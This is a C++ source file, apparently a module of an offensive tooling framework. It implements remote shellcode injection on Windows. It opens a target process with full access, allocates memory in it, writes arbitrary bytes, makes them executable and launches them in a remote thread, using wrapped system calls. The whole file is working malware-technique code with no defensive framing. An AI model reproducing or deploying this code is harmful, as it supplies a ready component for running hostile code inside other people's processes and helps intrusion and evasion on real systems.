#include "core/technique.hpp"

namespace Technique::Injection
{
    BOOL ShellcodeInjection(
        Procs::PPROCS pProcs,
        DWORD dwPID,
        const std::vector<BYTE>& bytes)
    {
        HANDLE hProcess;
        HANDLE hThread;
        LPVOID lpRemoteBuffer;

        LPVOID lpBuffer     = (LPVOID)bytes.data();
        SIZE_T dwBufferLen  = bytes.size();

        hProcess = System::Process::ProcessOpen(
            pProcs,
            dwPID,
            PROCESS_ALL_ACCESS
        );
        if (!hProcess)
        {
            return FALSE;
        }

        lpRemoteBuffer = System::Process::VirtualMemoryAllocate(
            pProcs,
            hProcess,
            nullptr,
            dwBufferLen,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if (!lpRemoteBuffer)
        {
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            lpRemoteBuffer,
            lpBuffer,
            dwBufferLen,
            NULL
        )) {
            System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        // Set PAGE_EXECUTE_READWRITE protection.
        DWORD dwOldProtect = PAGE_READWRITE;
        if (!System::Process::VirtualMemoryProtect(
            pProcs,
            hProcess,
            &lpRemoteBuffer,
            &dwBufferLen,
            PAGE_EXECUTE_READWRITE,
            &dwOldProtect
        )) {
            System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        hThread = System::Process::RemoteThreadCreate(
            pProcs,
            hProcess,
            (LPTHREAD_START_ROUTINE)lpRemoteBuffer,
            NULL
        );
        if (!hThread)
        {
            System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        System::Handle::HandleWait(pProcs, hThread, FALSE, nullptr);

        System::Handle::HandleClose(pProcs, hProcess);
        System::Handle::HandleClose(pProcs, hThread);

        return TRUE;
    }
}